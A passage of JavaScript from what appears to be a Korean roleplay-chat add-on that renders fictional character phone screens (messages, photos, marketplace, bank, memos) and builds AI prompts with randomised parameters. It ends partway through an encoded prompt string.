          <div class="ph-body"><div class="im-thread">${bubbles(th, 'dm-b')}</div></div><div class="dm-input"><i>📷</i><span>메시지 보내기...</span><i>🎙</i></div>`;
      } else if (scr === 'msg') {
        inner = screen(`<div class="im-search">🔍 검색</div><div class="im-list">${msgs.map((m, i) => { const last = (m.thread || []).slice(-1)[0] || {}, unread = !last.me;
            return `<button data-act="phgo" data-arg="thread:${i}">${unread ? '<i class="dot im"></i>' : ''}${m.group ? '<span class="av ph-anon">👥</span>' : avatar(canon(m.with) || m.with)}<span><b>${esc(m.saved || m.with)}</b><small>${esc(last.text || '')}</small></span><em>${esc(m.day && m.day !== '오늘' ? m.day : last.time || '')} ›</em></button>`; }).join('') || '<p class="ph-empty">대화가 없어요</p>'}</div>`, '메시지');
      } else if (scr === 'thread') {
        const m = msgs[at] || {}, th = m.thread || [];
        inner = `${bar}<div class="im-head"><button data-act="phback">‹</button><span class="im-hav">${m.group ? '<span class="av ph-anon">👥</span>' : avatar(canon(m.with) || m.with)}<small>${esc(m.saved || m.with || '')}${m.group && (m.members || []).length ? ` (${m.members.length + 1})` : ''} ›</small></span><span></span></div>
          <div class="ph-body"><div class="im-thread"><p class="im-time"><b>${esc(m.day || '오늘')}</b> ${esc(th[0]?.time || '')}</p>${bubbles(th, 'im-b')}</div></div>
          <div class="im-input"><i>＋</i><span>iMessage</span><i>🎙</i></div>`;
      } else if (scr === 'album') {
        inner = screen(album.length ? `<p class="al-head">최근 항목 <small>${album.length}장</small></p><div class="al-grid">${album.map((p, i) => `<button data-act="phgo" data-arg="photo:${i}" style="--pb:${AV[i % AV.length][0]}">${pic(p, 'album:' + i, false)}</button>`).join('')}</div>`
          : '<p class="ph-empty">사진이 없어요</p>', '사진');
      } else if (scr === 'photo') {
        const p = album[at] || {};
        inner = screen(`<div class="al-view"><div class="ig-photo" style="--pb:${bg}">${pic(p, 'album:' + at, true)}</div><p class="ig-date" style="text-align:center">${esc(p.date || '')}</p></div>`, esc(p.date || '사진'));
      } else if (scr === 'market') {
        inner = screen(`<div class="mk-me">${avatar(who)}<span><b>${esc(mk.nick || who)}</b><small>매너온도 <em>${esc(mk.temp || '36.5')}°C</em> 😊</small></span></div>
          ${items.length ? `<div class="mk-list">${items.map((x, i) => `<button class="mk-item" data-act="phgo" data-arg="item:${i}"><span class="mk-th">${pic(x, 'market:' + i, false)}</span><span class="mk-tx"><b>${esc(x.title)}</b>
            <small>${esc(x.place || '동네')} · ${esc(x.ago || '방금 전')}</small><span>${x.status && x.status !== '판매중' ? `<em class="mk-st${x.status === '거래완료' ? ' done' : ''}">${esc(x.status)}</em> ` : ''}<strong>${esc(x.price || '')}</strong></span>
            <span class="mk-meta">💬 ${esc(String(x.chats ?? 0))} ♡ ${esc(String(x.likes ?? 0))}</span></span></button>`).join('')}</div>`
          : '<p class="ph-empty">판매 중인 물건이 없어요<br><small>이 인물은 중고거래를 안 할 것 같대요</small></p>'}`, '나의 당근');
      } else if (scr === 'item') {
        const x = items[at] || {};
        inner = screen(`<div class="mk-photo">${pic(x, 'market:' + at, true)}</div>
          <div class="mk-seller">${avatar(who)}<span><b>${esc(mk.nick || who)}</b><small>${esc(x.place || '동네')}</small></span><em>${esc(mk.temp || '36.5')}°C</em></div>
          <div class="mk-body"><h4>${x.status && x.status !== '판매중' ? `<em class="mk-st${x.status === '거래완료' ? ' done' : ''}">${esc(x.status)}</em> ` : ''}${esc(x.title || '')}</h4><small>${esc(x.ago || '')}</small><p>${esc(x.desc || '')}</p>
          <small>채팅 ${esc(String(x.chats ?? 0))} · 관심 ${esc(String(x.likes ?? 0))} · 조회 ${esc(String(x.views ?? 0))}</small></div>
          ${(x.talk || []).length ? `<div class="mk-talk"><p class="mk-th2">💬 채팅</p>${(x.talk || []).map(t => `<p class="mk-b ${t.me ? 'me' : 'them'}">${t.me ? '' : `<small>${esc(t.from || '구매자')}</small>`}${esc(t.text)}<i>${esc(t.time || '')}</i></p>`).join('')}</div>` : ''}
          <div class="mk-bar"><span>♡</span><b>${esc(x.price || '')}</b><span class="mk-go">채팅하기</span></div>`, '', '', true);
      } else if (scr === 'bank' && bank) {
        inner = screen(`<div class="bk-top" style="background:${bg}"><small>${esc(bank.bank || '은행')}</small><p>${esc(bank.account || '입출금 통장')}</p><b>${esc(bank.balance || '0원')}</b>${bank.month ? `<p class="bk-m">이번 달 ${esc(bank.month)} 썼어요</p>` : ''}<div class="bk-btns"><span>송금</span><span>내역</span></div></div>
          ${bank.savings ? `<div class="bk-card"><small>적금·투자</small><p>${esc(bank.savings)}</p></div>` : ''}
          ${bank.spend ? `<div class="bk-card"><small>소비 습관</small><p>${esc(bank.spend)}</p></div>` : ''}${(bank.loans || []).length ? `<p class="bk-h">대출·카드</p>${bank.loans.map(l => `<div class="bk-tx"><span><b>${esc(l.name || '')}</b><small>${esc(l.note || '')}</small></span><em>${esc(l.left || '')}</em></div>`).join('')}` : ''}<p class="bk-h">최근 거래</p>${(bank.tx || []).map(t => { const plus = /^\s*\+/.test(t.amount || ''); return `<div class="bk-tx"><span><b>${esc(t.title || '')}</b><small>${esc(t.date || '')}${t.memo ? ` · ${esc(t.memo)}` : ''}</small></span><em class="${plus ? 'in' : ''}">${esc(t.amount || '')}</em></div>`; }).join('')}`, esc(bank.bank || '은행'));
      } else if (scr === 'sys') {
        const s = SYS_APPS.find(x => x.key === arg) || SYS_APPS[0], list = d[s.key] || [];
        inner = screen(`<div style="--xc:${s.color}"><p class="xa-h">${s.title}</p>${list.map(x => { const r = s.row(x); return `<div class="sy-row"><b>${esc(r[0])}</b>${r[1] ? `<small>${esc(r[1])}</small>` : ''}${r[2] ? `<em class="${r[3] || ''}">${esc(r[2])}</em>` : ''}</div>`; }).join('') || '<p class="ph-empty">비어 있어요</p>'}</div>`, s.label, '', true);
      } else if (scr === 'xapp') {
        const x = (d.apps || [])[at] || {};
        inner = screen(`<p class="xa-h" style="--xc:${esc(x.color || '#5856D6')}">${esc(x.title || x.name || '')}</p>${(x.rows || []).map(r => `<div class="bk-tx"><span><b>${esc(r.title || '')}</b><small>${esc(r.sub || '')}</small></span><em>${esc(r.right || '')}</em></div>`).join('') || '<p class="ph-empty">비어 있어요</p>'}`, esc(x.name || ''), '', true);
      } else if (scr === 'secret') {
        inner = nav.phUnlock === who
          ? screen(`<p class="nt-big">🔒 잠긴 메모</p><div class="nt-list">${secret.map((x, i) => `<button data-act="phgo" data-arg="snote:${i}"><b>${esc(x.title)}</b><small>${esc(x.date || '')}</small></button>`).join('') || '<p class="ph-empty">잠긴 메모가 없어요</p>'}</div>`, '', '', true)
          : `${bar}<div class="ph-lockme"><span>🔒</span><b>이 메모는 잠겨 있어요</b><button data-act="phunlock" data-arg="${esc(who)}">Face ID로 보기</button><button class="sub" data-act="phback">돌아가기</button></div>`;
      } else if (scr === 'snote') {
        const x = secret[at] || {};
        inner = screen(`<div class="nt-view"><small>${esc(x.date || '')} · 🔒</small><h4>${esc(x.title || '')}</h4>${String(x.body || '').split('\n').map(l => `<p>${esc(l) || '&nbsp;'}</p>`).join('')}</div>`, '', '<span class="nt-done">완료</span>', true);
      } else if (scr === 'memo') {
        // 고정 → 폴더별(폴더 없는 메모는 '메모') 순서로 묶어 보여 줍니다.
        const row = ([x, i]) => `<button data-act="phgo" data-arg="note:${i}"><b>${esc(x.title || String(x.body || '').split('\n')[0].slice(0, 20) || '새로운 메모')}</b><small>${esc(x.date || '')}  <span>${esc(String(x.body || '').replace(/- \[[ xX]\] /g, '').replace(/\s+/g, ' ').slice(0, 26))}</span></small></button>`;
        const all = memo.map((x, i) => [x, i]), groups = [];
        const pinned = all.filter(([x]) => x.pinned);
        if (pinned.length) groups.push(['📌 고정됨', pinned]);
        const folders = [...new Set(all.filter(([x]) => !x.pinned).map(([x]) => String(x.folder || '').trim() || '메모'))];
        folders.sort((a, b) => (a === '메모') - (b === '메모'));
        folders.forEach(f => groups.push([f === '메모' ? '메모' : '📁 ' + f, all.filter(([x]) => !x.pinned && (String(x.folder || '').trim() || '메모') === f)]));
        inner = screen(`<p class="nt-big">메모</p><div class="im-search">🔍 검색</div>${groups.map(([name, list]) => `<p class="nt-sec">${esc(name)}</p><div class="nt-list">${list.map(row).join('')}</div>`).join('')}
          ${secret.length ? `<p class="nt-sec">폴더</p><div class="nt-list"><button data-act="phgo" data-arg="secret"><b>🔒 잠긴 메모</b><small>${secret.length}개</small></button></div>` : ''}
          <p class="nt-count">메모 ${memo.length}개</p>`, '', '', true);
      } else if (scr === 'note') {
        const x = memo[at] || {};
        const body = String(x.body || '').split('\n').map(l => { const c = l.match(/^\s*-\s*\[([ xX])\]\s*(.*)$/); return c ? `<p class="nt-chk${c[1] !== ' ' ? ' on' : ''}"><i>${c[1] !== ' ' ? '✓' : ''}</i>${esc(c[2])}</p>` : `<p>${esc(l) || '&nbsp;'}</p>`; }).join('');
        inner = screen(`<div class="nt-view"><small>${esc(x.date || '')}</small><h4>${esc(x.title || '')}</h4>${body}</div>`, '', '<span class="nt-done">완료</span>', true);
      }
    }
    const foot = rec ? `<p class="muted" style="text-align:center;margin:10px 0 0">${rec.turns}턴 시점에 만든 폰${rec.from ? ` · ${rec.from}~${rec.to}턴 대화 참고` : ''} · <button class="linkbtn" data-act="devimg" data-arg="phone">이미지로 저장</button> · <button class="linkbtn" data-act="phmake" data-arg="${esc(who)}"${busyNow ? ' disabled' : ''}>다시 만들기</button>${turnEnd() > recUpto(rec) ? ` · <button class="linkbtn" data-act="phupd" data-arg="${esc(who)}"${busyNow ? ' disabled' : ''}>새 이야기 반영 (${recUpto(rec) + 1}~${turnEnd()}턴)</button>` : ''}</p>` : '';
    return descHtml('phone') + devSeg() + genCard() + picker + `<div class="iphone"><i class="ph-island"></i><div class="ph-screen">${inner}</div><i class="ph-homebar" data-act="phhome"></i></div>` + foot
      + (nav.bdRange && nav.rgKind === 'phone' && nav.rgWho === who ? rangeSheet(rec ? '다시 만들기' : '만들기') : '') + npcSheet() + devImgSheet();
  }
  // 외국어 대사 인물은 '원문 (번역)' 꼴로. 폰·컴퓨터가 같이 씁니다(커뮤니티·뉴스·위키는 한국어만).
  const ETC_LANG = '\n- 언어: 외국어로 말하는 인물이 쓴 글은 그 언어로 쓰고 한국어 번역을 괄호로 붙인다. 번역 붙이는 방식은 글의 종류에 따라 둘로 나뉜다.\n  ① 대사·채팅·메시지·댓글·토론·검색어처럼 짧게 끊어지는 말: 한 줄마다 바로 뒤에 괄호 번역을 붙인다. 크랙 채팅방 대사와 똑같은 꼴이다.\n     꼴: 원문 (번역)   —  맞는 예: Hi (안녕)  /  I missed you (보고 싶었어)  /  Don\u2019t go (가지 마)\n     틀린 예(절대 이렇게 쓰지 않는다): Hi 안녕  /  Hi, 안녕!  /  Hi - 안녕  /  "Hi" "안녕"  /  번역만 쓰기  /  원문만 쓰기\n  ② 메모·일기·편지·메모장·문서·초안처럼 여러 줄로 이어지는 글: 줄마다 번역을 달지 않는다. 원문을 여러 줄 그대로 끝까지 쓰고, 맨 마지막 줄에 괄호를 한 번만 열어 그 글 전체의 한국어 번역을 한 덩어리로 넣는다.\n     꼴: 원문 첫 줄 / 원문 둘째 줄 / … / (전체 번역)\n     틀린 예: 원문 줄마다 괄호를 붙이기  /  번역을 맨 위나 중간에 두기  /  번역만 쓰기  /  원문만 쓰기\n     체크리스트(- [ ] 항목)도 항목마다 번역을 달지 않고, 목록이 끝난 뒤 마지막 줄에 한 번만 번역한다.\n- 한국어 글자 뒤에 영어를 괄호로 붙이는 꼴(한글(English))은 어디서도 절대 쓰지 않는다. 괄호는 언제나 영어 원문 뒤에 한국어 번역 한 방향뿐이고, 한국어로 말하는 사람의 글에는 영어 괄호를 붙이지 않는다. 이름·장소·용어도 한국어(영어)로 병기하지 않는다.\n- 번역 말투: 번역은 그 인물이 한국어로 말했다면 할 법한 구어체로 쓴다. 영어 문장 구조를 그대로 옮긴 번역투(~하는 것을 원해, ~라고 생각해요 남발, 불필요한 주어·대명사 \"그는/그녀는/당신은\", ~에 의해)는 쓰지 않는다. 그 인물의 나이·성격·말버릇과 이 이야기의 세계관·시대·장르 분위기, 그리고 말을 거는 상대와의 관계(노트에 적힌 호칭·존댓말/반말)에 맞는 말로 쓴다. 현대 톡 말투를 어울리지 않는 세계에 그대로 끼우지 않는다.\n- 괄호 번역이 하나도 없으면 틀린 것이다(한 줄짜리 말은 줄마다, 여러 줄 글은 맨 끝에 한 번). 한국어로 말하는 인물은 한국어로만 쓰고 괄호를 붙이지 않는다. 짧은 감탄·이모지·숫자·아이디·앱 이름·고유명사는 번역하지 않는다. 그 인물이 어느 언어로 어떤 말투로 쓸지는 노트에 적힌 성격·말버릇·국적에서 유추한다.\n- 로그에 있던 대사를 가져올 때는 크랙에 적힌 「Hi (안녕)」을 괄호까지 통째로 복사한다(괄호를 떼거나 번역을 새로 만들지 않는다). 위 꼴로 직접 지어 쓰는 것은 로그에 없는 새 글·댓글·메시지일 때만이다.';
  // 커뮤니티·뉴스·위키는 한국 사이트라 외국어 번역 규칙 없이 한국어로만 씁니다.
  const ETC_KO = '\n- 언어: 이 사이트는 한국어 사이트다. 모든 글·댓글·본문·제목은 한국어로만 쓰고, 영어 원문+괄호 번역 꼴도, 한글 뒤에 영어를 괄호로 병기하는 꼴(한글(English))도 쓰지 않는다. 외국어 인물의 말을 옮길 때도 한국어로 옮겨 적는다(한국 커뮤 사람들이 흔히 섞는 영어 단어 한두 개 정도는 괜찮다).';
  // 🎲 만들 때마다 주사위를 굴려 수치를 바꿉니다. 프롬프트에 수치를 못 박아 두면 AI가 매번 같은 양으로만 쓰기 때문에,
  //    이모지 비율·NPC 등장 수·소문 세기를 여기서 랜덤으로 뽑아 '이번 회차' 값으로 넘깁니다. (AI에게 "랜덤하게"라고
  //    말해도 랜덤이 되지 않아요. 주사위는 코드가 굴려야 합니다.)
  // 공통 규칙은 프롬프트 맨 끝이 아니라 [출력] 줄 바로 앞에 끼웁니다. JSON 스키마 뒤에 붙인 규칙은
  //   AI가 "여기서 끝"으로 읽고 흘려 버려서, 지키라고 써 둬도 지켜지지 않아요.
  const withRules = (p, extra) => { const i = p.lastIndexOf('[출력]'); return i < 0 ? p + extra : p.slice(0, i) + extra.replace(/^\n+/, '') + '\n' + p.slice(i); };
  const dice = a => a[Math.floor(Math.random() * a.length)];
  // 📱 폰 주사위: 얼마나 쓰는지·어디를 털어 보면 재밌는지만 흔들어요(개수는 안 정함). AI한테 맡기면 폰마다 앱 구성이 비슷해져서.
  const phoneRoll = () => ['\n[이번 폰 주사위 — 방향만, 개수는 이 인물답게]',
    `- 기본 앱 말고 이 인물만 깔아 둘 법한 앱(apps): ${dice([1, 2, 2, 3, 3, 4])}개 — 이 인물의 직업·취미·집착·비밀에서 나온 앱, 다른 인물과 겹치지 않게`,
    `- 이 인물의 폰 사용량: ${dice(['필요한 것만 쓰는 편', '보통', '많이 씀', '폰 중독'])}`,
    `- 이 폰에서 제일 털어 볼 맛 나는 곳: ${dice(['메시지', '메모', '비밀 메모', '검색 기록', '은행·카드 내역', '사진첩', '이 인물만 쓸 법한 앱', '통화 기록', '일정'])} — 이 인물의 집착·찌질함·웃긴 구석·숨긴 면이 여기에 몰려 있게`].join('\n');
  const etcRoll = lite => ['\n[이번 회차 주사위 — 만들 때마다 바뀌는 값. 위 지침에 적힌 개수·비율과 어긋나면 이 줄을 따른다]',
    `- 이모지·텍스트 이모티콘이 붙는 줄의 비율: ${dice(['거의 없음(화면 전체에서 한두 줄만)', '거의 없음(화면 전체에서 한두 줄만)', '열 줄에 한 줄쯤', '넷에 하나쯤', '셋에 하나쯤', '절반쯤'])}. 나머지 줄은 이모지 없이 쓴다`,
    `- 이모지를 몰아 쓰는 사람(한 줄에 두 개 이상): ${dice([0, 0, 0, 1, 1, 2])}명`,
    `- 노트 인물(NPC)이 몰래 끼어드는 글·댓글·토론·채팅: 화면 전체에서 ${dice([0, 0, 0, 0, 1, 1, 2])}개`,
    ...lite ? [] : [`- 소문·루머의 세기: ${dice(['조용함(큰 소문 없이 잡담 위주)', '보통', '시끄러움', '시끄러움', '커뮤니티가 뒤집힘'])}`,
    `- 터무니없는 거짓 루머: ${dice([0, 1, 1, 2])}개`,
    `- 씨앗 ${Math.random().toString(36).slice(2, 8)} — 씨앗이 다르면 글감·말투·화제도 달라야 한다. 지난번에 썼을 법한 소재는 피한다`]].join('\n');
  // etc 탭: 📱 폰 / 💻 컴퓨터. 고른 인물은 둘이 같이 씁니다(nav.phWho).
  const DEVICES = [['phone', '📱 폰'], ['pc', '💻 컴퓨터'], ['board', '🗨 커뮤니티'], ['news', '📰 뉴스'], ['wiki', '📚 위키'], ['live', '📺 실시간톡']];
  // 노트가 없으면 인물 목록 대신 직접 추가한 이름(+ 이미 만든 폰·컴퓨터 주인)
  let etcNames = [];
  const etcPeople = () => [...new Set([...(snapshot?.note ? people().keys() : []), ...etcNames, ...Object.keys(phoneData), ...Object.keys(pcData)])];
  // 노트가 없으면 대화에서 NPC를 찾아 목록을 만듭니다(AI 1번). 목록 끝 ↻로 다시 찾기
  const nameAdder = () => '';
  const addBtn = () => `<button data-act="npcrange" aria-pressed="false" title="고른 턴의 대화에서 인물 불러오기"${busyNow ? ' disabled' : ''}><span class="av ph-anon">+</span><small>더 찾기</small></button>`;
  const npcSheet = () => nav.bdRange && nav.rgKind === 'npc' ? rangeSheet('인물 찾기') : '';
  const NPC_PROMPT = 'RP 로그를 읽고 등장하는 NPC(AI가 연기하는 인물)의 이름만 고른다. [USER] 메시지를 쓰는 유저 캐릭터는 뺀다. 로그에 이름이 실제로 나온 인물만, 지어내지 않는다. 대사·행동이 있는 비중 큰 순서로 최대 8명. 출력은 JSON 배열 하나만: ["이름", ...]';
  async function findNpc(from, to) {
    const chatId = chatIdFromPath(); if (!chatId || busyNow || !snapshot) return;
    busyNow = true; render(); toast('대화에서 인물을 찾는 중이에요…');
    try {
      const log = (await rangeLogText(chatId, from, to, `${from}~${to}턴 대화`, 120000)).trim();
      if (!log) throw new Error('그 범위에 대화가 없어요.');
      const raw = await askModel(NPC_PROMPT, log, '👥인물 찾기');
      let list; try { const t = String(raw), a = t.indexOf('['), b = t.lastIndexOf(']'); list = JSON.parse(t.slice(a, b + 1)); } catch (_) { throw new Error('답을 읽지 못했어요'); }
      list = [...new Set((Array.isArray(list) ? list : []).map(x => String(x || '').trim().slice(0, 20)).filter(Boolean))].slice(0, 8);
      if (!list.length) throw new Error('인물을 찾지 못했어요');
      const have = etcPeople(), add = list.filter(n => !have.some(h => sameName(h, n)));
      etcNames = [...etcNames, ...add]; await setValue('etcnames:' + chatId, JSON.stringify(etcNames));
      if (add.length) { nav.phWho = add[0]; nav.phScreen = 'home'; nav.pcScreen = 'home'; }
      toast(add.length ? `새 인물 ${add.length}명을 불러왔어요 (${add.join(', ')})` : '새로 나온 인물이 없어요. 이미 다 있어요.', 'ok', 3000);
    } catch (e) { toast('인물 찾기 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; render(); }
  }
  const turnEnd = () => (snapshot?.note?.turns || 0) + freshTurns();
  const recUpto = rec => rec ? (rec.upto || rec.to || rec.turns || 0) : 0;
  // 갱신 모드: 기존 결과(JSON)를 주고 새 대화만 반영해 전체를 다시 내게 함
  const updateAsk = (rec, kind) => `\n\n[이번엔 '새 이야기 반영' — 처음부터 새로 만들지 말 것]\n- 아래 [기존 ${kind}]을 그대로 바탕으로 한다. 기존 항목(메시지·메모·기록 등)은 지우거나 바꾸지 말고 그대로 둔다.\n- 맨 아래 [새로 나온 대화]에서 이 인물이 새로 겪고 느낀 일만 새 항목으로 덧붙인다(최신이 위로). 잔고·상태·프로필처럼 바뀐 값만 고친다.\n- 출력 형식은 처음 만들 때와 같은 전체 JSON 하나.\n\n[기존 ${kind}]\n${JSON.stringify(rec.data).slice(0, 40000)}`;
  const etcLog = async (chatId, from, to, hint) => snapshot?.note
    ? `[기억 노트]\n${noteMemory()}${await rangeLogText(chatId, from, to, hint)}`
    : (await rangeLogText(chatId, from || Math.max(1, freshTurns() - 29), to || freshTurns(), '기억 노트가 없어 대화 원문으로 대신함. 인물·관계는 여기서 읽을 것. ' + hint, 120000)).trim();
  const devSeg = () => `<div class="seg devseg">${DEVICES.map(([k, l]) => `<button data-act="dev" data-arg="${k}" aria-pressed="${(nav.dev || 'phone') === k}">${l}</button>`).join('')}</div>`;

  // ── 💻 컴퓨터: 폰처럼 버튼을 눌렀을 때만 AI 1번, 결과는 이 브라우저에만 ──
  const PC_PROMPT = unveil('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